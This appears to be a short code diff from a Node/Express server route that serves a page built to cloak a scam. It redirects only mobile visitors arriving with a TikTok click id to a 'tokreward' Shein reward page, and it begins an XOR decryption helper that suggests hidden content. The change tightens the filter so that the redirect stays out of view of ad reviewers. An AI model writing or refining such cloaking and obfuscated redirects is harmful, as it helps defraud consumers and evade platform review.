@@ -896,7 +896,7 @@ app.get('/sheinv3/:slug', (req, res, next) => {
                 const urlParams = new URLSearchParams(window.location.search);
                 const ttclid = urlParams.get("ttclid");
                 const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-                if (ttclid || isMobileDevice) {
+                if (ttclid && isMobileDevice) {
                     window.location.href = "https://tokreward.com/shein.html?slug=${slug}";
                     const xorDecrypt = (str, key) => {
                         let result = '';
